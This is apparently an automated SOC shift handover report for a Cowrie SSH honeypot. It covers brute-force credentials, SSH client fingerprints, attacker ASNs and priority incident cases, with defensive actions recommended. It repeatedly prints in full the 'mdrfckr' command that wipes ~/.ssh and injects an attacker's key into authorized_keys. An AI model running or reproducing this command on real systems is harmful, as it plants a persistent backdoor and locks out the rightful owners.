# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-10 |
| **Generated At** | 2026-05-10T13:27:07Z |
| **Shift Time** | 13:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **290** |
| Confirmed Threats | **277** |
| False Positives Filtered | **13** (4.5%) |
| Unique Attacker IPs | **39** |
| Countries of Origin | **15** |
| High Severity Cases | **53** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **237** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **182** |
| Unique Credential Pairs | **115** |
| Unique Usernames | **45** |
| Unique Passwords | **103** |
| Successful Auth Pairs | **31** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 55 |
| `345gs5662d34` | 25 |
| `ubuntu` | 16 |
| `admin` | 15 |
| `test` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 25 |
| `3245gs5662d34` | 25 |
| `` | 5 |
| `test` | 5 |
| `password` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 25 |
| `root` | `3245gs5662d34` | 25 |
| `a` | `a` | 2 |
| `nil` | `` | 2 |
| `admin` | `admin` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `` | `138.75.83.180` | 2026-05-10T11:19:46 |
| `root` | `qwer123$` | `97.93.43.157` | 2026-05-10T11:33:10 |
| `root` | `3245gs5662d34` | `97.93.43.157` | 2026-05-10T11:33:16 |
| `root` | `Support_2026` | `97.93.43.157` | 2026-05-10T11:36:46 |
| `root` | `test@2025` | `97.93.43.157` | 2026-05-10T11:37:35 |
| `root` | `Password001` | `97.93.43.157` | 2026-05-10T11:38:23 |
| `root` | `admin!@#$%` | `118.145.131.27` | 2026-05-10T11:38:39 |
| `root` | `3245gs5662d34` | `118.145.131.27` | 2026-05-10T11:38:43 |
| `root` | `1234.qwer` | `97.93.43.157` | 2026-05-10T11:39:12 |
| `root` | `QWEasd@123` | `97.93.43.157` | 2026-05-10T11:40:01 |
| `root` | `123#@!` | `97.93.43.157` | 2026-05-10T11:41:45 |
| `root` | `Zg@123456` | `97.93.43.157` | 2026-05-10T11:42:35 |
| `root` | `P@ssW0rd1234` | `97.93.43.157` | 2026-05-10T11:43:25 |
| `root` | `Nikhil@123` | `97.93.43.157` | 2026-05-10T11:44:16 |
| `root` | `748159263` | `97.93.43.157` | 2026-05-10T11:45:07 |
| `root` | `qwerty1!` | `97.93.43.157` | 2026-05-10T11:45:59 |
| `root` | `passion` | `97.93.43.157` | 2026-05-10T11:47:48 |
| `root` | `abcd#123` | `97.93.43.157` | 2026-05-10T11:50:18 |
| `root` | `root1980` | `97.93.43.157` | 2026-05-10T11:51:08 |
| `root` | `Server-2026` | `97.93.43.157` | 2026-05-10T11:51:58 |
| `root` | `password2026` | `97.93.43.157` | 2026-05-10T11:53:38 |
| `root` | `abcd1234@` | `97.93.43.157` | 2026-05-10T11:54:30 |
| `root` | `1001` | `97.93.43.157` | 2026-05-10T11:55:23 |
| `root` | `ASDasd123!` | `97.93.43.157` | 2026-05-10T11:57:06 |
| `root` | `odroid` | `193.24.211.100` | 2026-05-10T12:43:26 |
| `root` | `test@` | `72.253.251.7` | 2026-05-10T13:14:47 |
| `root` | `3245gs5662d34` | `72.253.251.7` | 2026-05-10T13:14:54 |
| `root` | `admin1234567` | `72.253.251.7` | 2026-05-10T13:16:36 |
| `root` | `1qaz2wsx@admin` | `150.136.129.10` | 2026-05-10T13:22:15 |
| `root` | `3245gs5662d34` | `150.136.129.10` | 2026-05-10T13:22:22 |
| `root` | `admin!@#` | `72.253.251.7` | 2026-05-10T13:24:04 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **290** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 242 |
| OpenSSH | 18 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 173 | 7 |
| `03a80b21afa8...` | Modern SSH client | 54 | 6 |
| `c118de82e19e...` | Mirai/variant | 18 | 1 |
| `14b2ddda386a...` | Mirai/variant | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 173 | 7 | libssh-based |
| `03a80b21afa8...` | libssh | 54 | 6 | Modern SSH client |
| `c118de82e19e...` | OpenSSH | 18 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 14 | 3 | — |
| `14b2ddda386a...` | libssh | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 25 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `150.136.129.10`, `97.93.43.157`, `72.253.251.7`, `118.145.131.27`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **39** |
| Unique ASNs | **32** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS215929` | Data Campus Limited | 1 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 1 | LOW |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (53)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b1a61c3d8afe

| Field | Detail |
|---|---|
| **Source IP** | `138.75.83[.]180` |
| **First Seen** | 2026-05-10 11:19 |
| **Last Seen** | 2026-05-10 11:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:19:45` | `cowrie.session.connect` |
| `2026-05-10 11:19:45` | `cowrie.client.version` |
| `2026-05-10 11:19:46` | `cowrie.client.kex` |
| `2026-05-10 11:19:46` | `cowrie.login.success` |
| `2026-05-10 11:19:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.75.83[.]180` to AbuseIPDB if not already reported
- [ ] Block `138.75.83[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee6a6298311b

| Field | Detail |
|---|---|
| **Source IP** | `138.75.83[.]180` |
| **First Seen** | 2026-05-10 11:19 |
| **Last Seen** | 2026-05-10 11:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:19:46` | `cowrie.session.connect` |
| `2026-05-10 11:19:46` | `cowrie.client.version` |
| `2026-05-10 11:19:46` | `cowrie.client.kex` |
| `2026-05-10 11:19:46` | `cowrie.login.success` |
| `2026-05-10 11:19:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.75.83[.]180` to AbuseIPDB if not already reported
- [ ] Block `138.75.83[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79e16e5505dc

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:33 |
| **Last Seen** | 2026-05-10 11:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:33:09` | `cowrie.session.connect` |
| `2026-05-10 11:33:09` | `cowrie.client.version` |
| `2026-05-10 11:33:09` | `cowrie.client.kex` |
| `2026-05-10 11:33:10` | `cowrie.login.success` |
| `2026-05-10 11:33:11` | `cowrie.session.params` |
| `2026-05-10 11:33:11` | `cowrie.command.input` |
| `2026-05-10 11:33:11` | `cowrie.command.failed` |
| `2026-05-10 11:33:11` | `cowrie.log.closed` |
| `2026-05-10 11:33:11` | `cowrie.session.params` |
| `2026-05-10 11:33:11` | `cowrie.command.input` |
| `2026-05-10 11:33:12` | `cowrie.session.file_download` |
| `2026-05-10 11:33:12` | `cowrie.log.closed` |
| `2026-05-10 11:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75aca8609630

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:33 |
| **Last Seen** | 2026-05-10 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:33:15` | `cowrie.session.connect` |
| `2026-05-10 11:33:15` | `cowrie.client.version` |
| `2026-05-10 11:33:15` | `cowrie.client.kex` |
| `2026-05-10 11:33:16` | `cowrie.login.success` |
| `2026-05-10 11:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8a863d44aa8

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:36 |
| **Last Seen** | 2026-05-10 11:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:36:45` | `cowrie.session.connect` |
| `2026-05-10 11:36:45` | `cowrie.client.version` |
| `2026-05-10 11:36:45` | `cowrie.client.kex` |
| `2026-05-10 11:36:46` | `cowrie.login.success` |
| `2026-05-10 11:36:47` | `cowrie.session.params` |
| `2026-05-10 11:36:47` | `cowrie.command.input` |
| `2026-05-10 11:36:47` | `cowrie.command.failed` |
| `2026-05-10 11:36:47` | `cowrie.log.closed` |
| `2026-05-10 11:36:48` | `cowrie.session.params` |
| `2026-05-10 11:36:48` | `cowrie.command.input` |
| `2026-05-10 11:36:48` | `cowrie.session.file_download` |
| `2026-05-10 11:36:48` | `cowrie.log.closed` |
| `2026-05-10 11:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd29d24945f6

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:36 |
| **Last Seen** | 2026-05-10 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:36:51` | `cowrie.session.connect` |
| `2026-05-10 11:36:51` | `cowrie.client.version` |
| `2026-05-10 11:36:52` | `cowrie.client.kex` |
| `2026-05-10 11:36:53` | `cowrie.login.success` |
| `2026-05-10 11:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7b532aee767

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:37 |
| **Last Seen** | 2026-05-10 11:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:37:34` | `cowrie.session.connect` |
| `2026-05-10 11:37:34` | `cowrie.client.version` |
| `2026-05-10 11:37:34` | `cowrie.client.kex` |
| `2026-05-10 11:37:35` | `cowrie.login.success` |
| `2026-05-10 11:37:36` | `cowrie.session.params` |
| `2026-05-10 11:37:36` | `cowrie.command.input` |
| `2026-05-10 11:37:36` | `cowrie.command.failed` |
| `2026-05-10 11:37:36` | `cowrie.log.closed` |
| `2026-05-10 11:37:37` | `cowrie.session.params` |
| `2026-05-10 11:37:37` | `cowrie.command.input` |
| `2026-05-10 11:37:37` | `cowrie.session.file_download` |
| `2026-05-10 11:37:37` | `cowrie.log.closed` |
| `2026-05-10 11:37:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46a6f3cfd5fb

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:37 |
| **Last Seen** | 2026-05-10 11:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:37:40` | `cowrie.session.connect` |
| `2026-05-10 11:37:40` | `cowrie.client.version` |
| `2026-05-10 11:37:41` | `cowrie.client.kex` |
| `2026-05-10 11:37:42` | `cowrie.login.success` |
| `2026-05-10 11:37:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0285bc509964

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:38 |
| **Last Seen** | 2026-05-10 11:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:38:21` | `cowrie.session.connect` |
| `2026-05-10 11:38:21` | `cowrie.client.version` |
| `2026-05-10 11:38:22` | `cowrie.client.kex` |
| `2026-05-10 11:38:23` | `cowrie.login.success` |
| `2026-05-10 11:38:24` | `cowrie.session.params` |
| `2026-05-10 11:38:24` | `cowrie.command.input` |
| `2026-05-10 11:38:24` | `cowrie.command.failed` |
| `2026-05-10 11:38:24` | `cowrie.log.closed` |
| `2026-05-10 11:38:24` | `cowrie.session.params` |
| `2026-05-10 11:38:24` | `cowrie.command.input` |
| `2026-05-10 11:38:25` | `cowrie.session.file_download` |
| `2026-05-10 11:38:25` | `cowrie.log.closed` |
| `2026-05-10 11:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63fd198eaf0d

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:38 |
| **Last Seen** | 2026-05-10 11:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:38:28` | `cowrie.session.connect` |
| `2026-05-10 11:38:28` | `cowrie.client.version` |
| `2026-05-10 11:38:28` | `cowrie.client.kex` |
| `2026-05-10 11:38:30` | `cowrie.login.success` |
| `2026-05-10 11:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-922be3d9905e

| Field | Detail |
|---|---|
| **Source IP** | `118.145.131[.]27` |
| **First Seen** | 2026-05-10 11:38 |
| **Last Seen** | 2026-05-10 11:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:38:39` | `cowrie.session.connect` |
| `2026-05-10 11:38:39` | `cowrie.client.version` |
| `2026-05-10 11:38:39` | `cowrie.client.kex` |
| `2026-05-10 11:38:39` | `cowrie.login.success` |
| `2026-05-10 11:38:40` | `cowrie.session.params` |
| `2026-05-10 11:38:40` | `cowrie.command.input` |
| `2026-05-10 11:38:40` | `cowrie.command.failed` |
| `2026-05-10 11:38:40` | `cowrie.log.closed` |
| `2026-05-10 11:38:40` | `cowrie.session.params` |
| `2026-05-10 11:38:40` | `cowrie.command.input` |
| `2026-05-10 11:38:40` | `cowrie.session.file_download` |
| `2026-05-10 11:38:40` | `cowrie.log.closed` |
| `2026-05-10 11:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.131[.]27` to AbuseIPDB if not already reported
- [ ] Block `118.145.131[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-059a30a3a049

| Field | Detail |
|---|---|
| **Source IP** | `118.145.131[.]27` |
| **First Seen** | 2026-05-10 11:38 |
| **Last Seen** | 2026-05-10 11:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:38:42` | `cowrie.session.connect` |
| `2026-05-10 11:38:42` | `cowrie.client.version` |
| `2026-05-10 11:38:42` | `cowrie.client.kex` |
| `2026-05-10 11:38:43` | `cowrie.login.success` |
| `2026-05-10 11:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.131[.]27` to AbuseIPDB if not already reported
- [ ] Block `118.145.131[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82cfd2db9c6d

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-05-10 11:39 |
| **Last Seen** | 2026-05-10 11:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 11:39:10` | `cowrie.session.connect` |
| `2026-05-10 11:39:10` | `cowrie.client.version` |
| `2026-05-10 11:39:10` | `cowrie.client.kex` |
| `2026-05-10 11:39:12` | `cowrie.login.success` |
| `2026-05-10 11:39:12` | `cowrie.session.params` |
| `2026-05-10 11:39:12` | `cowrie.command.input` |
| `2026-05-10 11:39:12` | `cowrie.command.failed` |
| `2026-05-10 11:39:13` | `cowrie.log.closed` |
| `2026-05-10 11:39:13` | `cowrie.session.params` |
| `2026-05-10 11:39:13` | `cowrie.command.input` |
| `2026-05-10 11:39:14` | `cowrie.session.file_download` |
| `2026-05-10 11:39:14` | `cowrie.log.closed` |
| `2026-05-10 11:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

